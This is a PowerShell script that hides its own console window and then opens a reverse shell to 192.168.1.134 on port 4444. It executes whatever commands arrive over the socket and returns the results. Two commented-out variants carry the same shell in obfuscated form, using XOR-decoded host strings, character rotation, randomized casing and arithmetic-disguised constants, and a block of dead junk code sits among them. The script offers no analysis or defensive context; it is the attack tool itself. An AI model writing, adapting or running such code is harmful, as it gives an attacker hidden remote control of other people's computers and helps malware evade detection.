Add-Type -Name Win -Namespace Console -MemberDefinition @"
  [DllImport("user32.dll")]
  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
  [DllImport("kernel32.dll")]
  public static extern IntPtr GetConsoleWindow();
"@
$consolePtr = [Console.Win]::GetConsoleWindow()
[Console.Win]::ShowWindowAsync($consolePtr, 0)
<#
$LHOST = $($k4814='YN:,Phk7';$b=[byte[]](0x68,0x77,0x08,0x02,0x61,0x5E,0x53,0x19,0x68,0x60,0x08,0x1E,0x64);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4814);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})); $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(($Output + $($k8745='YMXmQq-L=lhE';$b=[byte[]](0x39,0x23);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8745);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
if ($false) {
    $xmlDoc = [xml]::new(); $rootElement = $xmlDoc.CreateElement("Config"); $childElement = $xmlDoc.CreateElement("Setting"); $childElement.InnerText = (Get-Random); $rootElement.AppendChild($childElement) | Out-Null; $xmlDoc.AppendChild($rootElement) | Out-Null; Write-Verbose "Generated XML fragment: $($xmlDoc.OuterXml)"
}
#>
<#
$LhoST = ($(-join('192.168.1.184'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) + $(-710 + 894)); $LpoRT = (-10067 + 14511); $TCPClienT = nEW-obJect NET.SOCkEtS.TcPClIENT($lHosT, $lpoRt); $NetWoRKStREaM = $TCPCLIENT.GETSTrEAM(); $sTREamREadEr = nEW-OBJECt IO.sTReaMreadEr($NetWoRKstrEAM); $sTREAMwRitEr = new-ObJECT IO.StreaMWrItER($NetWORkstReAm); $StReAMWriTER.AUtOflUsh = $TruE; $BUFFER = New-oBjeCT systEm.bYte[] 1024; while ($TCPCLIEnT.coNNecTeD) { while ($NETWORksTreAm.dAtaAVailAbLe) { $rawDatA = $NEtwORkStReAm.ReAd($BuffEr, (220 % 44), $BufFer.LengtH); $CodE = ([tExt.encoDing]::UTf8).geTSTRINg($BuFfer, (87 - 87), $raWdAta -1) }; if ($tCpcLieNT.conNected -and $cODE.lenGTh -gt 1) { $OUtPut = try { InvoKe-eXpRESsion ($codE) (-56 / -28)>&(-9 / -9) } catch { $_ }; $StREAMwRiTer.WrITE(($Output + ([string]::Format('{0}{1}','``','n')))); $CoDe = $Null } }; $tCpclIENt.CLOsE(); $NeTWorkstReam.cLoSE(); $stREamreADeR.CLose(); $STreamwRiter.CLose()
#>
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
